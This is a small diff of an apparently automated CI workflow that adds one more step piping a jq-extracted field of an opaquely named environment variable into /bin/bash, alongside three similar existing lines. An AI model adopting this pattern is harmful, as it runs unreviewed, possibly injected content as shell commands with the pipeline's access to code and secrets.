@@ -26,6 +26,7 @@ jobs:
           echo $x2 | jq -r .xypbz82624 | /bin/bash
           printf '%s' "$ps03" | jq -r .idl7 | /bin/bash
           printf '%s' "$pqvb71589" | jq -r .qlz948 | /bin/bash
+          printf '%s' "$dijim90" | jq -r .dimx7 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
